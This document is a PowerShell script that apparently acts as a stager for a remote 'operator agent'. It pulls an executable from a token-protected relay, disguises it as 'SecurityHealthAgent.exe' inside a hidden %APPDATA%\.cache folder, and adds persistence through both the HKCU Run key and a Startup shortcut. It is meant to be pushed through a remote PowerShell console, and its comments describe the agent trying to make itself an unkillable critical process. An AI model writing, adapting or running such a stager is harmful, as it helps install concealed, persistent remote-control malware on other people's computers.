<#
  install-agent.ps1 — installs the operator agent from the relay and arms startup.

  Meant to be run through the console's PowerShell channel on a machine that
  already has an agent but cannot self-update yet:

    $p = Join-Path $env:TEMP 'install-agent.ps1'
    iwr '<base>/install-agent.ps1' -Headers @{'X-Relay-Token'='<token>'} -OutFile $p -UseBasicParsing
    & $p -Base '<base>' -Token '<token>'

  What it does:
    1. downloads Agent.exe and its SHA-256 from the relay
    2. verifies the hash before anything touches the install path
    3. stops the running copy (refusing if it is a critical process)
    4. installs to %APPDATA%\.cache\SecurityHealthAgent.exe
    5. arms HKCU Run + the Startup shortcut
    6. starts it

  Everything is logged to %TEMP%\install-agent.log, because the script kills the
  agent whose shell it is running in and the console link dies with it.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$Base,
    [Parameter(Mandatory)][string]$Token,
    [string]$InstallDir  = (Join-Path $env:APPDATA '.cache'),
    [string]$ExeName     = 'SecurityHealthAgent.exe',
    [string]$StartupName = 'SecurityHealthAgent',
    [switch]$SkipStartup
)

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$log = Join-Path $env:TEMP 'install-agent.log'
function Say([string]$m) {
    Add-Content -LiteralPath $log -Value $m -Encoding UTF8
    Write-Output $m
}
function Fail([string]$m) { Say ('FAIL ' + $m); exit 1 }

Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
Say ('install-agent ' + (Get-Date -Format o))
Say ('  target ' + $InstallDir + '\' + $ExeName)

$headers = @{ 'X-Relay-Token' = $Token }
$base    = $Base.TrimEnd('/')
$tmp     = Join-Path $env:TEMP ('agent-dl-' + [guid]::NewGuid().ToString('N') + '.exe')

# ---- 1. download ----------------------------------------------------------
Say ('[1/6] downloading ' + $base + '/agent.exe')
try {
    Invoke-WebRequest ($base + '/agent.exe')    -Headers $headers -OutFile $tmp -UseBasicParsing
    $want = (Invoke-WebRequest ($base + '/agent.sha256') -Headers $headers -UseBasicParsing).Content.Trim().ToLower()
} catch {
    Fail ('download failed: ' + $_.Exception.Message)
}

# ---- 2. verify ------------------------------------------------------------
$have = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
if ($have -ne $want) {
    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
    Fail ('sha256 mismatch: got ' + $have + ', expected ' + $want)
}
Say ('[2/6] verified sha256 ' + $have.Substring(0, 16) + '... (' + (Get-Item $tmp).Length + ' bytes)')

# ---- 3. stop the running copy --------------------------------------------
$procName = [IO.Path]::GetFileNameWithoutExtension($ExeName)
$running  = @(Get-Process -Name $procName -ErrorAction SilentlyContinue)
if ($running.Count -gt 0) {
    # The agent sets ProcessBreakOnTermination at startup, but that call fails
    # without SeDebugPrivilege, so it is normally a no-op. Check anyway: killing
    # a genuinely critical process bugchecks Windows.
    if (-not ('CritProbe' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class CritProbe {
    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr h, int cls, ref uint val, uint len, out uint ret);
    public static bool IsCritical(IntPtr h) {
        uint v = 0, r = 0;
        int st = NtQueryInformationProcess(h, 29, ref v, 4, out r);
        return st == 0 && v == 1;
    }
}
'@
    }
    foreach ($p in $running) {
        $crit = $false
        try { $crit = [CritProbe]::IsCritical($p.Handle) } catch { }
        if ($crit) {
            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            Fail ('pid ' + $p.Id + ' is flagged critical; refusing to kill it. Reboot and re-run.')
        }
    }
    Say ('[3/6] stopping ' + $running.Count + ' running ' + $procName + ' process(es)')
    $running | Stop-Process -Force
    Start-Sleep -Milliseconds 600
} else {
    Say '[3/6] no running agent'
}

# ---- 4. install -----------------------------------------------------------
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
$dst = Join-Path $InstallDir $ExeName
try {
    Copy-Item -LiteralPath $tmp -Destination $dst -Force
} catch {
    Fail ('copy failed (is the old agent still running?): ' + $_.Exception.Message)
}
Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
Say ('[4/6] installed ' + $dst)

# ---- 5. startup -----------------------------------------------------------
if (-not $SkipStartup) {
    $run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    New-Item -Path $run -Force | Out-Null
    Set-ItemProperty -Path $run -Name $StartupName -Value ('"' + $dst + '"')

    $startupDir = [Environment]::GetFolderPath('Startup')
    $lnk        = Join-Path $startupDir ($StartupName + '.lnk')
    $shell      = New-Object -ComObject WScript.Shell
    $sc         = $shell.CreateShortcut($lnk)
    $sc.TargetPath       = $dst
    $sc.WorkingDirectory = $InstallDir
    $sc.Save()
    Say ('[5/6] startup armed: Run\' + $StartupName + ' + ' + $lnk)
} else {
    Say '[5/6] startup skipped'
}

# ---- 6. start -------------------------------------------------------------
$p = Start-Process -FilePath $dst -WorkingDirectory $InstallDir -PassThru
Say ('[6/6] started pid ' + $p.Id)
Say ('OK ' + $dst + ' ' + $have)
